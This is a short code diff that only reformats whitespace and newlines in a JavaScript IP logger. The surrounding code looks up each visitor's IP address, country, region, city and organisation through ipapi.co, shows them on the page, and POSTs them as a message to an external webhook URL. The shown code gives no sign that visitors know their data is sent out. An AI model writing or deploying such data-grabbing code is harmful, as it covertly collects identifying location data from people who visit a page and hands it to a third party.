@@ -4,11 +4,11 @@ fetch("https://ipapi.co/json/")
     .then(response => response.json())
     .then(json => {
         const ip = json.ip;
-        const version = json.version; 
-        const country = json.country_name; 
-        const region = json.region; 
-        const org = json.org; 
-        const city = json.city; 
+        const version = json.version;
+        const country = json.country_name;
+        const region = json.region;
+        const org = json.org;
+        const city = json.city;
 
         document.getElementById("IP").innerHTML = ip;
         document.getElementById("version").innerHTML = version;
@@ -18,7 +18,7 @@ fetch("https://ipapi.co/json/")
         document.getElementById("city").innerHTML = city;
 
         const msg = {
-            "content": `ip - ${ip}\n version - ${version}\n country - ${country}\n region - ${region}\n org - ${org}\n city - ${city}`
+            "content": `ip - ${ip}\nversion - ${version}\ncountry - ${country}\nregion - ${region}\norg - ${org}\ncity - ${city}`
         };
 
         return fetch(whurl + "?wait=true", {
